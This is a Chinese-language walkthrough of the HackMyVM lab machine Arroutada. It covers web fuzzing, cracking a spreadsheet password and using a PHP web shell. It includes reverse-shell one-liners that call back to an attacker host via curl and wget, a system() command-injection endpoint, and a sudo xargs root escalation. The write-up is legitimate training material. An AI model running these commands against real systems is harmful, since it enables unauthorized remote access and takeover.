# Arroutada

2025.02.20 https://hackmyvm.eu/machines/machine.php?vm=Arroutada

[video](https://www.bilibili.com/video/BV1pPAHehEvx/?spm_id_from=333.1387.upload.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

扫描后 http://192.168.5.39/scout/ 提示有一个路径 `/scout/******/docs/` 先用 seclists 的字典 ffuf 进行探测：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://192.168.5.39/scout/FUZZ/docs

http://192.168.5.39/scout/j2/docs/
```

找到路径，发现 http://192.168.5.39/scout/j2/docs/pass.txt 中显示 user:password ，另外一个路径 http://192.168.5.39/scout/j2/docs/shellfile.ods 下载后查看文件类型 shellfile.ods: OpenDocument Spreadsheet 用 olevba 查看没有宏代码，在线打开 ods 文件需要输入密码，输入 user:password 显示密码不对，可能这个是个密码的格式，需要自己构建字典。

在同列表中 http://192.168.5.39/scout/j2/docs/z206 中有内容：

```
Ignore z*, please
Jabatito
```

发现了一个用户名 Jabatito，同时上面的 `z*` 可能是提示密码不是 z 开头。

尝试使用 john + rockyou 破解 ods 文件密码：

```
libreoffice2john shellfile.ods > hash
```

找到密码: john11 浏览 ods 文件得到新的路径: /thejabasshell.php 访问后什么都没有，进行参数探测：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.39/thejabasshell.php?FUZZ=/etc/passwd
```

找到参数 a 访问 http://192.168.5.39/thejabasshell.php?a=1 提示 Error: Problem with parameter "b" 好像还有另外一个参数 b 需要提供内容，继续 fuzz：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://192.168.5.39/thejabasshell.php?a=1&b=FUZZ'
```

找到 b 的值为 pass 然后访问 curl 'http://192.168.5.39/thejabasshell.php?a=id&b=pass' 返回 www-data 可以执行命令，反弹到 kali，得到了 shell：

```
curl -G --data-urlencode 'b=pass' --data-urlencode 'a=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.39/thejabasshell.php
```

进行系统枚举，发现 crontab：

```
* * * * * drito /home/drito/service
```

但是没权限读取

发现 127.0.0.1 处有一个 8000 的 web 服务，nc 访问下首页：

```
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

Brainfuck 解码：all HackMyVM hackers!!

访问 http://127.0.0.1:8000/priv.php 看看，源码中显示：

```
/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

可以命令执行，使用 json 传递命令，目标机器上没有 curl，使用 wget 进行传递：

```
wget -q -O- --post-data '{"command":"/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1\""}' --header "content-type: application/json" http://127.0.0.1:8000/priv.php
```

kali 上得到了反弹的连接，拿到了 user flag：

```
drito@arroutada:~$ cat user.txt
785f64437c6e1f9af6aa1afcc91ed27c
```

sudo -l 显示 (ALL : ALL) NOPASSWD: /usr/bin/xargs 可以直接提权到 root：

```
sudo xargs -a /dev/null sh

# cat root.txt
R3VuYXhmR2JGenlOYXFOeXlVbnB4WmxJWg==
```

base64 和 rot13 后解出 root flag ： ThanksToSmlAndAllHackMyVM
